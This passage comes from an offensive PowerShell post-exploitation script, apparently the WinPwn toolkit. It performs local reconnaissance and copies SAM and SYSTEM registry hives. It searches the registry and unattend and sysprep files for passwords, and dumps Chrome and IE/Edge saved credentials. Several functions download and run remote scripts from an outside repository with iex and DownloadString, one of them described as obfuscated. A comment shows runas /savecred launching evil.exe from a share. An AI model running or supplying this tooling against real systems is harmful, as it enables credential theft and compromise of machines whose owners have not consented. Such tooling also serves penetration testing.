        Get-LocalGroup | ft Name >> "$currentPath\LocalRecon\LocalGroups.txt"
      Write-Host -ForegroundColor Yellow 'Getting network interfaces, route information, Arp table'
        Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address >> "$currentPath\LocalRecon\Networkinterfaces.txt"
        Get-DnsClientServerAddress -AddressFamily IPv4 | ft >> "$currentPath\LocalRecon\DNSServers.txt"
        Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex >> "$currentPath\LocalRecon\NetRoutes.txt"
        Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State >> "$currentPath\LocalRecon\ArpTable.txt"
        netstat -ano >> "$currentPath\LocalRecon\ActiveConnections.txt"
        Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse | Get-ItemProperty -Name Version, Release -ErrorAction 0 | where { $_.PSChildName -match '^(?!S)\p{L}'} | select PSChildName, Version, Release >> "$currentPath\LocalRecon\InstalledDotNetVersions"
        Write-Host -ForegroundColor Yellow 'Getting Shares'
      net share >> "$currentPath\LocalRecon\Networkshares.txt"
      Write-Host -ForegroundColor Yellow 'Getting hosts file content'
      get-content $env:windir\System32\drivers\etc\hosts | out-string  >> "$currentPath\LocalRecon\etc_Hosts_Content.txt"
      Get-ChildItem -Path HKLM:\Software\*\Shell\open\command\ >> "$currentPath\LocalRecon\Test_for_Argument_Injection.txt"
  }
    else
    {
        Write-Host -ForegroundColor Yellow '--------------> Collecting local system Informations for later lookup, saving them to .\LocalRecon\ ---------->'
        systeminfo 
        Write-Host -ForegroundColor Yellow '-------> Getting Patches'
      wmic qfe 
        wmic os get osarchitecture 
      Write-Host -ForegroundColor Yellow '-------> Getting environment variables'
        Get-ChildItem Env: | ft Key,Value 
      Write-Host -ForegroundColor Yellow '-------> Getting connected drives'
        Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root 
        Write-Host -ForegroundColor Yellow '-------> Getting current user Privileges'
      whoami /priv 
        Write-Host -ForegroundColor Yellow '-------> Getting local user account information'
        Get-LocalUser | ft Name,Enabled,LastLogon
        Write-Host -ForegroundColor Yellow '-------> Getting local Accounts/Users + Password policy'
      net accounts
        Get-LocalGroup | ft Name
      Write-Host -ForegroundColor Yellow '-------> Getting network interfaces, route information, Arp table'
        Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
        Get-DnsClientServerAddress -AddressFamily IPv4 | ft 
        Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex 
        Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State 
        netstat -ano 
        Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse | Get-ItemProperty -Name Version, Release -ErrorAction 0 | where { $_.PSChildName -match '^(?!S)\p{L}'} | select PSChildName, Version, Release 
        Write-Host -ForegroundColor Yellow '-------> Getting Shares'
      net share
      Write-Host -ForegroundColor Yellow '-------> Getting hosts file content'
      get-content $env:windir\System32\drivers\etc\hosts | out-string 
      Get-ChildItem -Path HKLM:\Software\*\Shell\open\command\ 
    }
    #Stolen and integrated from 411Hall's JAWS
  Write-Host -ForegroundColor Yellow 'Searching for files with Full Control and Modify Access'
  Function Get-FireWallRule
          {
        Param ($Name, $Direction, $Enabled, $Protocol, $profile, $action, $grouping)
        $Rules=(New-object -comObject HNetCfg.FwPolicy2).rules
        If ($name)      {$rules= $rules | where-object {$_.name     -like $name}}
        If ($direction) {$rules= $rules | where-object {$_.direction  -eq $direction}}
        If ($Enabled)   {$rules= $rules | where-object {$_.Enabled    -eq $Enabled}}
        If ($protocol)  {$rules= $rules | where-object {$_.protocol   -eq $protocol}}
        If ($profile)   {$rules= $rules | where-object {$_.Profiles -bAND $profile}}
        If ($Action)    {$rules= $rules | where-object {$_.Action     -eq $Action}}
        If ($Grouping)  {$rules= $rules | where-object {$_.Grouping -like $Grouping}}
        $rules
      }
	    
      if(!$consoleoutput){Get-firewallRule -enabled $true | sort direction,name | format-table -property Name,localPorts,direction | out-string -Width 4096 >> "$currentPath\LocalRecon\Firewall_Rules.txt"}else{Get-firewallRule -enabled $true | sort direction,name | format-table -property Name,localPorts,direction | out-string -Width 4096} 
	    
      $output = " Files with Full Control and Modify Access`r`n"
      $output = $output +  "-----------------------------------------------------------`r`n"
          $files = get-childitem C:\
          foreach ($file in $files)
          {
              try {
                  $output = $output +  (get-childitem "C:\$file" -include *.ps1,*.bat,*.com,*.vbs,*.txt,*.html,*.conf,*.rdp,.*inf,*.ini -recurse -EA SilentlyContinue | get-acl -EA SilentlyContinue | select path -expand access | 
                  where {$_.identityreference -notmatch "BUILTIN|NT AUTHORITY|EVERYONE|CREATOR OWNER|NT SERVICE"} | where {$_.filesystemrights -match "FullControl|Modify"} | 
                  ft @{Label="";Expression={Convert-Path $_.Path}}  -hidetableheaders -autosize | out-string -Width 4096)
                  }
                  catch{$output = $output +   "`nFailed to read more files`r`n"}
            }
      Write-Host -ForegroundColor Yellow 'Searching for folders with Full Control and Modify Access'
      $output = $output +  "-----------------------------------------------------------`r`n"
          $output = $output +  " Folders with Full Control and Modify Access`r`n"
          $output = $output +  "-----------------------------------------------------------`r`n"
          $folders = get-childitem C:\
          foreach ($folder in $folders)
          {
              try 
            {
                $output = $output +  (Get-ChildItem -Recurse "C:\$folder" -EA SilentlyContinue | ?{ $_.PSIsContainer} | get-acl  | select path -expand access |  
                where {$_.identityreference -notmatch "BUILTIN|NT AUTHORITY|CREATOR OWNER|NT SERVICE"}  | where {$_.filesystemrights -match "FullControl|Modify"} | 
                select path,filesystemrights,IdentityReference |  ft @{Label="";Expression={Convert-Path $_.Path}}  -hidetableheaders -autosize | out-string -Width 4096)
              }
            catch 
          {
              $output = $output +  "`nFailed to read more folders`r`n"
            }
            }
      if(!$consoleoutput){$output >> "$currentPath\LocalRecon\Files_and_Folders_with_Full_Modify_Access.txt"}else{Write-Host "------->JAWS Recon";$output}
	    
   Write-Host -ForegroundColor Yellow '-------> Checking for potential sensitive user files'
   if(!$consoleoutput){get-childitem "C:\Users\" -recurse -Include *.zip,*.rar,*.7z,*.gz,*.conf,*.rdp,*.kdbx,*.crt,*.pem,*.ppk,*.txt,*.xml,*.vnc.*.ini,*.vbs,*.bat,*.ps1,*.cmd -EA SilentlyContinue | %{$_.FullName } | out-string >> "$currentPath\LocalRecon\Potential_Sensitive_User_Files.txt"}else{get-childitem "C:\Users\" -recurse -Include *.zip,*.rar,*.7z,*.gz,*.conf,*.rdp,*.kdbx,*.crt,*.pem,*.ppk,*.txt,*.xml,*.vnc.*.ini,*.vbs,*.bat,*.ps1,*.cmd -EA SilentlyContinue | %{$_.FullName } | out-string} 
	 
   Write-Host -ForegroundColor Yellow '-------> Checking AlwaysInstallElevated'
   $HKLM = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer"
     $HKCU =  "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer"
     if (($HKLM | test-path) -eq "True") 
     {
         if (((Get-ItemProperty -Path $HKLM -Name AlwaysInstallElevated).AlwaysInstallElevated) -eq 1)
         {
            if(!$consoleoutput){echo "AlwaysInstallElevated enabled on this host!" >> "$currentPath\Vulnerabilities\AlwaysInstallElevatedactive.txt"}else{Write-Host -ForegroundColor Red "AlwaysInstallElevated enabled on this host!"}
         }
     }
     if (($HKCU | test-path) -eq "True") 
     {
         if (((Get-ItemProperty -Path $HKLM -Name AlwaysInstallElevated).AlwaysInstallElevated) -eq 1)
         {
            if(!$consoleoutput){echo "AlwaysInstallElevated enabled on this host!" >> "$currentPath\Vulnerabilities\AlwaysInstallElevatedactive.txt"}else{Write-Host -ForegroundColor Red "AlwaysInstallElevated enabled on this host!"}
         }
     }
   Write-Host -ForegroundColor Yellow '-------> Checking if Netbios is active'
   $EnabledNics= @(gwmi -query "select * from win32_networkadapterconfiguration where IPEnabled='true'")

   $OutputObj = @()
         foreach ($Network in $EnabledNics) 
       {
        If($network.tcpipnetbiosoptions) 
        {	
          $netbiosEnabled = [bool]$network
         if ($netbiosEnabled){Write-Host 'Netbios is active, vulnerability found.'; echo "Netbios Active, check localrecon folder for network interface Info" >> "$currentPath\Vulnerabilities\NetbiosActive.txt"}
        }
        $nic = gwmi win32_networkadapter | where {$_.index -match $network.index}
        $OutputObj  += @{
      Nic = $nic.netconnectionid
      NetBiosEnabled = $netbiosEnabled
    }
   }
   $out = $OutputObj | % { new-object PSObject -Property $_} | select Nic, NetBiosEnabled| ft -auto
   if(!$consoleoutput){$out >> "$currentPath\LocalRecon\NetbiosInterfaceInfo.txt"}else{$out}
	    
   Write-Host -ForegroundColor Yellow '-------> Checking if IPv6 is active (mitm6 attacks)'
   $IPV6 = $false
   $arrInterfaces = (Get-WmiObject -class Win32_NetworkAdapterConfiguration -filter "ipenabled = TRUE").IPAddress
   foreach ($i in $arrInterfaces) {$IPV6 = $IPV6 -or $i.contains(":")}
   if(!$consoleoutput){if ($IPV6){Write-Host 'IPv6 enabled, thats another vulnerability (mitm6)'; echo "IPv6 enabled, check all interfaces for the specific NIC" >> "$currentPath\Vulnerabilities\IPv6_Enabled.txt" }}else{if ($IPV6){Write-Host 'IPv6 enabled, thats another vulnerability (mitm6)'; echo "IPv6 enabled, check all interfaces for the specific NIC"}}
	 
   Write-Host -ForegroundColor Yellow '-------> Collecting installed Software informations'
   if(!$consoleoutput){Get-Installedsoftware -Property DisplayVersion,InstallDate | out-string -Width 4096 >> "$currentPath\LocalRecon\InstalledSoftwareAll.txt"}else{Get-Installedsoftware -Property DisplayVersion,InstallDate | out-string -Width 4096}
         
   iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Invoke-Vulmap.ps1')
   Write-Host -ForegroundColor Yellow '-------> Checking if Software is outdated and therefore vulnerable / exploitable'
   if(!$consoleoutput){Invoke-Vulmap | out-string -Width 4096 >> "$currentPath\Vulnerabilities\VulnerableSoftware.txt"}else{Invoke-Vulmap | out-string -Width 4096}
        
            
     # Collecting more information
     Write-Host -ForegroundColor Yellow '-------> Checking for accesible SAM/SYS Files'
     if(!$consoleoutput){
        If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP'){Get-ChildItem -path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP' -Recurse >> "$currentPath\LocalRecon\SNMP.txt"}            
        If (Test-Path -Path %SYSTEMROOT%\repair\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\repair\SAM "$currentPath\Vulnerabilities\SAM"}
        If (Test-Path -Path %SYSTEMROOT%\System32\config\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\System32\config\SAM "$currentPath\Vulnerabilities\SAM"}
        If (Test-Path -Path %SYSTEMROOT%\System32\config\RegBack\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\System32\config\RegBack\SAM "$currentPath\Vulnerabilities\SAM"}
        If (Test-Path -Path %SYSTEMROOT%\System32\config\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\System32\config\SAM "$currentPath\Vulnerabilities\SAM"}
        If (Test-Path -Path %SYSTEMROOT%\repair\system){Write-Host -ForegroundColor Yellow "SYS File reachable, looking for SAM?";copy %SYSTEMROOT%\repair\system "$currentPath\Vulnerabilities\SYS"}
        If (Test-Path -Path %SYSTEMROOT%\System32\config\SYSTEM){Write-Host -ForegroundColor Yellow "SYS File reachable, looking for SAM?";copy %SYSTEMROOT%\System32\config\SYSTEM "$currentPath\Vulnerabilities\SYS"}
        If (Test-Path -Path %SYSTEMROOT%\System32\config\RegBack\system){Write-Host -ForegroundColor Yellow "SYS File reachable, looking for SAM?";copy %SYSTEMROOT%\System32\config\RegBack\system "$currentPath\Vulnerabilities\SYS"}
     }
     else
     {
        If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP'){Get-ChildItem -path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP' -Recurse >> "$currentPath\LocalRecon\SNMP.txt"}            
        If (Test-Path -Path %SYSTEMROOT%\repair\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable at %SYSTEMROOT%\repair\SAM"}
        If (Test-Path -Path %SYSTEMROOT%\System32\config\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable at %SYSTEMROOT%\System32\config\SAM, looking for SYS?"}
        If (Test-Path -Path %SYSTEMROOT%\System32\config\RegBack\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable at %SYSTEMROOT%\System32\config\RegBack\SAM, looking for SYS?"}
        If (Test-Path -Path %SYSTEMROOT%\System32\config\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable at %SYSTEMROOT%\System32\config\SAM, looking for SYS?"}
        If (Test-Path -Path %SYSTEMROOT%\repair\system){Write-Host -ForegroundColor Yellow "SYS File reachable at %SYSTEMROOT%\repair\system, looking for SAM?"}
        If (Test-Path -Path %SYSTEMROOT%\System32\config\SYSTEM){Write-Host -ForegroundColor Yellow "SYS File reachable at %SYSTEMROOT%\System32\config\SYSTEM, looking for SAM?"}
        If (Test-Path -Path %SYSTEMROOT%\System32\config\RegBack\system){Write-Host -ForegroundColor Yellow "SYS File reachable at %SYSTEMROOT%\System32\config\RegBack\system, looking for SAM?"} 
     }
     Write-Host -ForegroundColor Yellow '-------> Checking Registry for potential passwords'
     if(!$consoleoutput){
     REG QUERY HKLM /F "passwor" /t REG_SZ /S /K >> "$currentPath\LocalRecon\PotentialHKLMRegistryPasswords.txt"
     REG QUERY HKCU /F "password" /t REG_SZ /S /K >> "$currentPath\LocalRecon\PotentialHKCURegistryPasswords.txt"
     }
     else
     {
        REG QUERY HKLM /F "passwor" /t REG_SZ /S /K
        REG QUERY HKCU /F "password" /t REG_SZ /S /K
     }
     Write-Host -ForegroundColor Yellow '-------> Checking sensitive registry entries..'
     If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon')
   {
    if(!$consoleoutput){reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" >> "$currentPath\LocalRecon\Winlogon.txt"}else{reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"}
   }
     
     if(!$consoleoutput){
     If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\Current\ControlSet\Services\SNMP'){reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" >> "$currentPath\LocalRecon\SNMPParameters.txt"}
     If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Software\SimonTatham\PuTTY\Sessions'){reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" >> "$currentPath\Vulnerabilities\PuttySessions.txt"}
     If (Test-Path -Path 'Registry::HKEY_CURRENT_USER\Software\ORL\WinVNC3\Password'){reg query "HKCU\Software\ORL\WinVNC3\Password" >> "$currentPath\Vulnerabilities\VNCPassword.txt"}
     If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4'){reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password >> "$currentPath\Vulnerabilities\RealVNCPassword.txt"}

     If (Test-Path -Path C:\unattend.xml){copy C:\unattend.xml "$currentPath\Vulnerabilities\unattended.xml"; Write-Host -ForegroundColor Yellow 'Unattended.xml Found, check it for passwords'}
     If (Test-Path -Path C:\Windows\Panther\Unattend.xml){copy C:\Windows\Panther\Unattend.xml "$currentPath\Vulnerabilities\unattended.xml"; Write-Host -ForegroundColor Yellow 'Unattended.xml Found, check it for passwords'}
     If (Test-Path -Path C:\Windows\Panther\Unattend\Unattend.xml){copy C:\Windows\Panther\Unattend\Unattend.xml "$currentPath\Vulnerabilities\unattended.xml"; Write-Host -ForegroundColor Yellow 'Unattended.xml Found, check it for passwords'}
     If (Test-Path -Path C:\Windows\system32\sysprep.inf){copy C:\Windows\system32\sysprep.inf "$currentPath\Vulnerabilities\sysprep.inf"; Write-Host -ForegroundColor Yellow 'Sysprep.inf Found, check it for passwords'}
     If (Test-Path -Path C:\Windows\system32\sysprep\sysprep.xml){copy C:\Windows\system32\sysprep\sysprep.xml "$currentPath\Vulnerabilities\sysprep.inf"; Write-Host -ForegroundColor Yellow 'Sysprep.inf Found, check it for passwords'}
     }
     else
     {
        If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\Current\ControlSet\Services\SNMP'){reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"}
        If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Software\SimonTatham\PuTTY\Sessions'){reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"}
        If (Test-Path -Path 'Registry::HKEY_CURRENT_USER\Software\ORL\WinVNC3\Password'){reg query "HKCU\Software\ORL\WinVNC3\Password"}
        If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4'){reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password}

        If (Test-Path -Path C:\unattend.xml){Write-Host -ForegroundColor Yellow 'Unattended.xml Found at C:\unattend.xml, check it for passwords'}
        If (Test-Path -Path C:\Windows\Panther\Unattend.xml){Write-Host -ForegroundColor Yellow 'Unattended.xml Found at C:\Windows\Panther\Unattend.xml, check it for passwords'}
        If (Test-Path -Path C:\Windows\Panther\Unattend\Unattend.xml){Write-Host -ForegroundColor Yellow 'Unattended.xml Found at C:\Windows\Panther\Unattend\Unattend.xml, check it for passwords'}
        If (Test-Path -Path C:\Windows\system32\sysprep.inf){Write-Host -ForegroundColor Yellow 'Sysprep.inf Found at C:\Windows\system32\sysprep.inf, check it for passwords'}
        If (Test-Path -Path C:\Windows\system32\sysprep\sysprep.xml){Write-Host -ForegroundColor Yellow 'Sysprep.inf Found at C:\Windows\system32\sysprep\sysprep.xml, check it for passwords'}
     }
     
     if(!$consoleoutput){Get-Childitem -Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue >> "$currentPath\Vulnerabilities\webconfigfiles.txt"}else{Get-Childitem -Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue}
	    
   Write-Host -ForegroundColor Yellow '-------> List running tasks'
     if(!$consoleoutput){Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize >> "$currentPath\LocalRecon\RunningTasks.txt"}else{Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize}

     Write-Host -ForegroundColor Yellow '-------> Checking for usable credentials (cmdkey /list)'
     if(!$consoleoutput){cmdkey /list >> "$currentPath\Vulnerabilities\SavedCredentials.txt"}else{cmdkey /list} # runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
}


# Looking for Event logs via  djhohnsteins c# eventlog parser ported to powershell
function Powershellsensitive
{
    Param (
    [Switch]
    $consoleoutput,
    [Switch]
    $noninteractive   
  )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
  Write-Host -ForegroundColor Yellow '-------> Parsing Event logs for sensitive Information:'
    iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Invoke-EventLogparser.ps1')
  if(!$consoleoutput){
    [EventLogParser.EventLogHelpers]::Parse4104Events("$currentPath\LocalRecon\EventLog4013SensitiveInformations.txt","5")
    [EventLogParser.EventLogHelpers]::Parse4103Events()
    Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} | Select-Object -Property Message | Select-String -Pattern 'SecureString' >> "$currentPath\LocalRecon\Powershell_Logs.txt" 
    if (isadmin){[EventLogParser.EventLogHelpers]::Parse4688Events()}
    }
    else
    {
        [EventLogParser.EventLogHelpers]::Parse4104Events(" ","5")
      [EventLogParser.EventLogHelpers]::Parse4103Events()
      Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} | Select-Object -Property Message | Select-String -Pattern 'SecureString' 
        if (isadmin){[EventLogParser.EventLogHelpers]::Parse4688Events()}
    }
}

function Dotnet{
   Param (
    [Switch]
    $consoleoutput,
    [Switch]
    $noninteractive   
  )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    Write-Host -ForegroundColor Yellow '-------> Searching for .NET Services on this system:'
    #Lee Christensen's .NET Binary searcher
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Get-DotNetServices.ps1')
    if(!$consoleoutput){Get-DotNetServices  >> "$currentPath\LocalRecon\DotNetBinaries.txt"}else{Get-DotNetServices}
}

function Morerecon{
    Param (
    [Switch]
    $consoleoutput,
    [Switch]
    $noninteractive   
  )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    if (isadmin)
    {
        
        # P0wersploits local recon function
        IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Get-ComputerDetails.ps1')
    
        Write-Host -ForegroundColor Yellow '-------> Dumping general computer information '
        if(!$consoleoutput){Get-ComputerDetails >> "$currentPath\LocalRecon\Computerdetails.txt"}else{Get-ComputerDetails}

    }
}

function Sensitivefiles{
    Param (
    [Switch]
    $consoleoutput,
    [Switch]
    $noninteractive   
  )    
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    # obfuscated + string replaced p0werview
    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/find-interesting.ps1')
    if(!$consoleoutput){
        Write-Host -ForegroundColor Yellow 'Looking for interesting files:'
        try{Find-InterestingFile -Path 'C:\' >> "$currentPath\LocalRecon\InterestingFiles.txt"}catch{Write-Host ":-("}
        try{Find-InterestingFile -Path 'C:\' -Terms pass,login,rdp,kdbx,backup >> "$currentPath\LocalRecon\MoreFiles.txt"}catch{Write-Host ":-("}
        Write-Verbose "Enumerating more interesting files..."

        $SearchStrings = "*secret*","*net use*","*.kdb*","*creds*","*credential*","*.vmdk","*confidential*","*proprietary*","*pass*","*credentials*","web.config","KeePass.config*","*.kdbx","*.key","tnsnames.ora","ntds.dit","*.dll.config","*.exe.config"
        $IndexedFiles = Foreach ($String in $SearchStrings) {Get-IndexedFiles $string}

        $IndexedFiles |Format-List |Out-String -width 500 >> "$currentPath\LocalRecon\Sensitivelocalfiles.txt"
        GCI $ENV:USERPROFILE\ -recurse -include *pass*,*diagram*,*.pdf,*.vsd,*.doc,*docx,*.xls,*.xlsx,*.kdbx,*.kdb,*.rdp,*.key,KeePass.config | Select-Object Fullname,LastWriteTimeUTC,LastAccessTimeUTC,Length | Format-Table -auto | Out-String -width 500 >> "$currentPath\LocalRecon\MoreSensitivelocalfiles.txt"
    }
    else
    {
        Write-Host -ForegroundColor Yellow 'Looking for interesting files:'
        try{Find-InterestingFile -Path 'C:\'}catch{Write-Host ":-("}
        try{Find-InterestingFile -Path 'C:\' -Terms pass,login,rdp,kdbx,backup }catch{Write-Host ":-("}
        Write-Verbose "Enumerating more interesting files..."

        $SearchStrings = "*secret*","*net use*","*.kdb*","*creds*","*credential*","*.vmdk","*confidential*","*proprietary*","*pass*","*credentials*","web.config","KeePass.config*","*.kdbx","*.key","tnsnames.ora","ntds.dit","*.dll.config","*.exe.config"
        $IndexedFiles = Foreach ($String in $SearchStrings) {Get-IndexedFiles $string}

        $IndexedFiles |Format-List |Out-String -width 500 
        GCI $ENV:USERPROFILE\ -recurse -include *pass*,*diagram*,*.pdf,*.vsd,*.doc,*docx,*.xls,*.xlsx,*.kdbx,*.kdb,*.rdp,*.key,KeePass.config | Select-Object Fullname,LastWriteTimeUTC,LastAccessTimeUTC,Length | Format-Table -auto | Out-String -width 500 
    }
}

function Browserpwn{
    Param (
    [Switch]
    $consoleoutput,
    [Switch]
    $noninteractive   
  )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    $chrome = "yes"
    if (!$noninteractive){$chrome = Read-Host -Prompt 'Dump Chrome Browser history and maybe passwords? (yes/no)'}
    if ($chrome -eq "yes" -or $chrome -eq "y" -or $chrome -eq "Yes" -or $chrome -eq "Y")
    {
        # Lee Christensen's Chrome-Dump Script
        iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Get-ChromeDump.ps1')
        try
        {
            Install-SqlLiteAssembly
            if(!$consoleoutput){
                Get-ChromeDump >> "$currentPath\Exploitation\Chrome_Credentials.txt"
                Get-ChromeHistory >> "$currentPath\LocalRecon\ChromeHistory.txt"
            }
            else{
                Get-ChromeDump
                Get-ChromeHistory
            }
            Write-Host -ForegroundColor Yellow 'Done, look in the localrecon folder for creds/history:'
        }
        catch{}
    }
    $IE = "yes"
    if (!$noninteractive){$IE = Read-Host -Prompt 'Dump IE / Edge Browser passwords? (yes/no)'}
    if ($IE -eq "yes" -or $IE -eq "y" -or $IE -eq "Yes" -or $IE -eq "Y")
    {
        [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
        $vault = New-Object Windows.Security.Credentials.PasswordVault 
        if(!$consoleoutput){$vault.RetrieveAll() | % { $_.RetrievePassword();$_ } >> "$currentPath\Exploitation\InternetExplorer_Credentials.txt"}else{$vault.RetrieveAll() | % { $_.RetrievePassword();$_ }}
    }
    $browserinfos = "yes"
    if (!$noninteractive){$browserinfos = Read-Host -Prompt 'Dump all installed Browser history and bookmarks? (yes/no)'}
    if ($browserinfos -eq "yes" -or $browserinfos -eq "y" -or $browserinfos -eq "Yes" -or $browserinfos -eq "Y")
    {
        # Stolen from Steve Borosh @rvrsh3ll
        IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Get-BrowserInformation.ps1')
        if(!$consoleoutput){Get-BrowserInformation | out-string -Width 4096 >> "$currentPath\LocalRecon\AllBrowserHistory.txt"}else{Get-BrowserInformation | out-string -Width 4096}
    }
}

function Get-IndexedFiles 
{
     param (
     [Parameter(Mandatory=$true)][string]$Pattern)  
     
     $drives = (Get-PSDrive -PSProvider FileSystem).Root
     foreach ($drive in $drives)
     {
     Write-Host -ForegroundColor Yellow "Searching for files in drive $drive" 
     $Path = $drive 
        
     $pattern = $pattern -replace "\*", "%"  
     $path = $path + "\%"
    
     $con = New-Object -ComObject ADODB.Connection
     $rs = New-Object -ComObject ADODB.Recordset
    
     Try {
     $con.Open("Provider=Search.CollatorDSO;Extended Properties='Application=Windows';")}
     Catch {
      "[-] Indexed file search provider not available";Break
     }
     $rs.Open("SELECT System.ItemPathDisplay FROM SYSTEMINDEX WHERE System.FileName LIKE '" + $pattern + "' " , $con)
    
     While(-Not $rs.EOF){
      $rs.Fields.Item("System.ItemPathDisplay").Value
      $rs.MoveNext()
     }
     }
}

function Dotnetsearch
{
    Param (
    [Switch]
    $consoleoutput,
    [Switch]
    $noninteractive   
  )
    # Copied from https://gist.github.com/TheWover/49c5cfd0bbcd4b6c54eb1bb29812ce6e
    Param([parameter(Mandatory=$true,
       HelpMessage="Directory to search for .NET Assemblies in.")]
       $Directory,
       [parameter(Mandatory=$false,
       HelpMessage="Whether or not to search recursively.")]
       [switch]$Recurse = $true,
       [parameter(Mandatory=$false,
       HelpMessage="Whether or not to include DLLs in the search.")]
       [switch]$DLLs = $true,
       [parameter(Mandatory=$false,
       HelpMessage="Whether or not to include all files in the search.")]
       [switch]$All = $true,
       [Switch]$consoleoutput,
       [Switch]$noninteractive 
       )
    
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    if($noninteractive -and $consoleoutput)
    {
        Write-Host "-------> Searching for installed .NET Binaries under Program Files "
        Get-ChildItem -Path 'C:\Program Files' -Recurse -ErrorAction SilentlyContinue -Force  | % { try {$asn = [System.Reflection.AssemblyName]::GetAssemblyName($_.fullname); $_.fullname } catch {} }
        Write-Host "-------> Searching for installed .NET Binaries under Program Files (x86)"
        Get-ChildItem -Path 'C:\Program Files (x86)' -Recurse -ErrorAction SilentlyContinue -Force  | % { try {$asn = [System.Reflection.AssemblyName]::GetAssemblyName($_.fullname); $_.fullname } catch {} }
    }
    if($All)
    {
        Get-ChildItem -Path $Directory -Recurse:$Recurse -ErrorAction SilentlyContinue -Force  | % { try {$asn = [System.Reflection.AssemblyName]::GetAssemblyName($_.fullname); $_.fullname >> "$currentPath\DotNetBinaries.txt"} catch {} }
        type "$currentPath\DotNetBinaries.txt"
        Sleep(4)
    }
    else
    {
        Get-ChildItem -Path $Directory -Filter *.exe -Recurse:$Recurse -ErrorAction SilentlyContinue -Force  | % { try {$asn = [System.Reflection.AssemblyName]::GetAssemblyName($_.fullname); $_.fullname >> "$currentPath\DotNetBinaries.txt"} catch {} }
        
        if ($DLLs)
        {
